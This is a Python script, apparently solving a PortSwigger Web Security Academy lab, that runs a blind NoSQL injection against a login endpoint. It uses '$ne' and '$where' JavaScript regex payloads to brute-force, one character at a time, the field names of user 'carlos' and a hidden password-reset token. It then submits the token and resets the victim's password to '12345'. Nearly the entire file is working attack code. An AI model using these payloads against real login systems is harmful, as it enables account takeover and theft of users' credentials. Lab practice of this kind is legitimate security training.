import string
import requests
from bs4 import BeautifulSoup

#forgotPwd
url = "https://0a8700f904550836808390fe00e20035.web-security-academy.net"

fields = []
specialField = ""
forgottenPasswordToken = ""
newPassword = "12345"

theAlphabet = list(string.ascii_lowercase) +  list(string.ascii_uppercase)
theAlphabet.append("[")
theAlphabet.append("]")
theAlphabet.append("-")
theAlphabet.append("_")
theAlphabet.append("+")
theAlphabet.append("!")
theAlphabet.append("@")
theAlphabet.append("#")
theAlphabet.append("$")
theAlphabet.append("%")
theAlphabet.append("^")
theAlphabet.append("&")
theAlphabet.append("*")
theAlphabet.append("(")
theAlphabet.append(")")
theAlphabet.append("0")
theAlphabet.append("1")
theAlphabet.append("2")
theAlphabet.append("3")
theAlphabet.append("4")
theAlphabet.append("5")
theAlphabet.append("6")
theAlphabet.append("7")
theAlphabet.append("8")
theAlphabet.append("9")

def GetSession():
    print(f"[i] Connecting to {url}")
    try:
        results = requests.get(url)
        headers = results.headers

        cookiesArray = headers['Set-Cookie']

        cookie = cookiesArray.split(";")

        for c in cookie:
                session =  c.split("=")
                if session[0] == 'session':
                    return session[1]
    except Exception as e:
        return None
    return None

def ResetPassword(session):

    print(f"[!] Fetching csrf token...")
    headers = {"Cookie":"session=" + session}
    html = requests.get(url + "/forgot-password", headers=headers)

    soup = BeautifulSoup(html.content,'html.parser')

    tokenInput = soup.find('input', {'name': 'csrf'})

    print(f"[+] Csrf Token is {tokenInput['value']}")

    html = requests.post(url + "/forgot-password", "csrf=" + tokenInput['value'] + "&username=carlos", headers=headers)

    if "Please check your email for a reset password link." in str(html.content):
        print(f"[+] Request sent.")
        return True
    else:
        print(f"[!] Error can not request e-mail reset.")
        return False

def CheckField(fieldNumber,postion,letter, session):
    headers = {"Cookie":"session=" + session, "Content-Type":"application/json"}

    html = requests.post(url + "/login", "{\"username\":\"carlos\",\"password\": { \"$ne\": \"invalid\" },\"$where\":\"Object.keys(this)["+ str(fieldNumber) +"].match('^.{" + str(postion) + "}"+ letter + ".*')\"}", headers=headers)

    soup = BeautifulSoup(html.content,'html.parser')

    warningPara = soup.find('p', class_='is-warning')

    if (warningPara):
        if (warningPara.text == "Account locked: please reset your password"):
            return True
    else:
        return False
        print("[!] Error warning message not found")

    return False

def CheckFieldLength(length,session):
    headers = {"Cookie":"session=" + session, "Content-Type":"application/json"}

    html = requests.post(url + "/login", "{\"username\":\"carlos\",\"password\": { \"$ne\": \"invalid\" },\"$where\":\"Object.keys(this).length == " + str(length) + "\"}", headers=headers)
    soup = BeautifulSoup(html.content,'html.parser')

    warningPara = soup.find('p', class_='is-warning')

    if (warningPara):
        if (warningPara.text == "Account locked: please reset your password"):
            return True
    else:
        return False
        print("[!] Error warning message not found")

    return False

def CheckFieldNameLength(fieldNumber,length,session):
    headers = {"Cookie":"session=" + session, "Content-Type":"application/json"}

    html = requests.post(url + "/login", "{\"username\":\"carlos\",\"password\": { \"$ne\": \"invalid\" },\"$where\":\"Object.keys(this)["+ str(fieldNumber) + "].length == " + str(length) + "\"}", headers=headers)

    soup = BeautifulSoup(html.content,'html.parser')

    warningPara = soup.find('p', class_='is-warning')

    if (warningPara):
        if (warningPara.text == "Account locked: please reset your password"):
            return True
    else:
        return False
        print("[!] Error warning message not found")

    return False

def CheckTokenLength(specialField,length,session):
    headers = {"Cookie":"session=" + session, "Content-Type":"application/json"}

    html = requests.post(url + "/login", "{\"username\":\"carlos\",\"password\": { \"$ne\": \"invalid\" },\"$where\":\"this."+ specialField + ".length == " + str(length) + "\"}", headers=headers)

    soup = BeautifulSoup(html.content,'html.parser')

    warningPara = soup.find('p', class_='is-warning')

    if (warningPara):
        if (warningPara.text == "Account locked: please reset your password"):
            return True
    else:
        return False
        print("[!] Error warning message not found")

    return False

def CheckToken(specialFieldName, postion,letter, session):
    headers = {"Cookie":"session=" + session, "Content-Type":"application/json"}

    html = requests.post(url + "/login", "{\"username\":\"carlos\",\"password\": { \"$ne\": \"invalid\" },\"$where\":\"this." + specialFieldName  + ".match('^.{" + str(postion) + "}"+ letter + ".*')\"}", headers=headers)

    soup = BeautifulSoup(html.content,'html.parser')

    warningPara = soup.find('p', class_='is-warning')

    if (warningPara):
        if (warningPara.text == "Account locked: please reset your password"):
            return True
    else:
        return False
        print("[!] Error warning message not found")

    return False

def GetTokenLength(specialField,session):
    count = 0
    while (not CheckTokenLength(specialField,count,session)):
        count += 1
        if count == 128:
            return 0
    return count



def GetFieldLength(session):
    count = 0
    while (not CheckFieldLength(count,session)):
        count += 1
        if count == 128:
            return 0
    return count

def GetFieldNameLength(fieldNumber,session):
    count = 0
    while (not CheckFieldNameLength(fieldNumber,count,session)):
        count += 1
        if count == 128:
            return 0
    return count

def CheckForTokenField(fieldName, session):
    headers = {"Cookie":"session=" + session }

    html = requests.get(url + "/forgot-password?" + fieldName + "=invalid", headers=headers)

    if "Invalid token" in str(html.content):
        return True
    return False

def SubmitForgettenPasswordToken(fieldName,token,session):
    headers = {"Cookie":"session=" + session }

    html = requests.get(url + "/forgot-password?" + fieldName + "=" + token, headers=headers)

    soup = BeautifulSoup(html.content,'html.parser')
    csrfToken = soup.find('input', {'name': 'csrf'})

    return csrfToken['value']


def ChangePassword(csrfChangePasswordToken,specialField,forgottenPasswordToken,newPassword,session):
    headers = {"Cookie":"session=" + session }
    payload = "csrf=" + csrfChangePasswordToken + "&" + specialField + "=" + forgottenPasswordToken + "&new-password-1=" + newPassword + "&new-password-2=" + newPassword 
    html = requests.post(url + "/forgot-password",payload, headers=headers)


 
## MAIN 
session = GetSession()

if session:
    print(f"[+] Session: {session}")
    print(f"[!] Sending reset password request.")
    ResetPassword(session)
    print(f"[i] Getting field length")

    fieldLen = GetFieldLength(session)

    print(f"[+] Field Length is {str(fieldLen)}")
    print(f"[i] Brutal forcing field name")

    for i in range(0,fieldLen):
        fieldNameLen = GetFieldNameLength(i,session)

        if (fieldNameLen == 0):
            break

        print(f"[+] Field #{str(i)} is {str(fieldNameLen)} long.")

        print(f"[+] Field #{str(i)}'s name: ", end="", flush=True)

        word = ""
        for j in range(0,fieldNameLen):
            for letter in theAlphabet:                  
                if CheckField(i,j,letter, session):
                    word += letter
                    print(letter, end="", flush=True)
                    break

        fields.append(word)

        print("")

    print(f"[i] Searching for special field..")
    for field in fields:
        if CheckForTokenField(field, session):
            specialField=field
            print(f"[+] Field found: {field}")
            break

    print(f"[i] Getting Token Length.")
    tokenLength = GetTokenLength(specialField,session)
    print(f"[+] Token Length is {tokenLength}.")

    print(f"[i] Brutal Forcing Token.", end="",flush=True)

    for j in range(0,tokenLength):
        for letter in theAlphabet:                  
            if CheckToken(specialField,j,letter, session):
                forgottenPasswordToken += letter
                print(letter, end="", flush=True)
                break
    print("")

    print(f"[i] Submitting token.")
    csrfChangePasswordToken = SubmitForgettenPasswordToken(specialField,forgottenPasswordToken, session)

    if csrfChangePasswordToken:
        print(f"[i] Changing password to {newPassword}.")
        if ChangePassword(csrfChangePasswordToken,specialField,forgottenPasswordToken,newPassword,session):
            print(f"[+] Done!! ")
else:
    print(f"[!] Error: could not get session")
